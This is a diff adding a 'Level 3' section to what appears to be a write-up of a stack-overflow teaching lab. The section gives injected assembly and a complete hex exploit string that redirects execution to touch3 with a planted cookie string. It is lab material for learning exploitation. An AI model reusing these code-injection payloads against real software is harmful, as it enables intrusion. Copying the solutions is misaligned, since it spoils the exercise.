@@ -39,3 +39,22 @@ ec 17 40 00 00 00 00 00
 00 00 00 00 00 00 00 00
 78 dc 61 55 00 00 00 00
 ```
+
+## Level 3
+This one is also pretty simple. We need to call touch3 and store the address of our cookie string in register `%rdi`. The challenge we face are the various instructions that will overwrite our stack. Hence, we need to store the string representation of our cookie on an address which will not get overwritten. Notice how the `pushq` instruction we use in our execution code pushes data on address `0x5561dca0`. This means, all the future pushes to the stack will be on addresses starting from `0x5561dca0` and onwards. Therefore, we will store our string in the stack on address `0x5561dca8`. Our execution code will look like this:
+```asm
+0:	68 fa 18 40 00       	pushq  $0x4018fa
+5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
+c:	c3                   	retq
+```
+
+Solution:
+```
+68 fa 18 40 00 48 c7 c7
+a8 dc 61 55 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61 /* Our cookie's string representation */
+```
